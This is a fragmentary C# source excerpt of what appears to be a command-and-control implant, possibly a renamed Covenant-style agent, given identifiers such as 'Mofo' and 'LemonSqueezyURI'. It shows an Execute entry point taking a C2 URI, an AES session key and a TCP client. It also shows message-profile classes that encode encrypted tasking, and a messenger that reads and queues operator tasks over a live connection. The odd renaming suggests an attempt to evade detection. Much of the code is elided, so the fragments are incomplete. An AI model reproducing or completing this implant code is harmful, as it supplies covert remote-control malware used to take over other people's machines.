...
namespace MofoExecutor
{
    class Mofo
    {
        public static void Execute(string LemonSqueezyURI, string SOMEID, Aes SessKEy, TcpClient client)
        {
            try
            {
                ...
                BridgeMessenger bAsemEsSenger = new BridgeMessenger(LemonSqueezyURI, SOMEID, ProfileWriteFormat);
                ...
                (
                    ...
                    bAsemEsSenger,
                    new Profile(ProfileWriteFormat, ProfileReadFormat, SOMEID)
                );
    ...
    public class Profile
    {
        ...
        public MofoEncMsg ParseReadFormat(string Message) { return Parse(this.ReadFormat, Message); }
        public MofoEncMsg ParseWriteFormat(string Message) { return Parse(this.WriteFormat, Message); }
        public string FormatRead(MofoEncMsg Message) { return Format(this.ReadFormat, this.Guid, Message); }
        public string FormatWrite(MofoEncMsg Message) { return Format(this.WriteFormat, this.Guid, Message); }
        ...
        private static string Format(string Format, string someid, MofoEncMsg Message)
        {
            return String.Format(Format,
                Utilities.MessageTransform.Transform(Common.MofoEncoding.GetBytes(MofoEncMsg.ToJson(Message))), someid
            );
        }
    }
    ...
    public class TaskingMessenger
    {
        ...
        public MofoTaskingMessage ReadTaskingMessage()
        {
            ...
            {
                mofoMessage = this.Profile.ParseReadFormat(readMessage.Message);
            }
            else if (readMessage.Type == MessageType.Write)
            {
                mofoMessage = this.Profile.ParseWriteFormat(readMessage.Message);
            }
            if (mofoMessage == null)
            {
                return null;
        ...
        public void QueueTaskingMessage(string Message, string Meta = "")
        {
            ...
            string uploaded = this.Profile.FormatWrite(mofoMessage);
                ...
                while (downstream.IsConnected)
                {
                    try
                    {
                        ...
                        if (read != null && !string.IsNullOrEmpty(read.Message))
                        {
                            ...
                            {
                                MofoEncMsg message = this.Profile.ParseWriteFormat(read.Message);
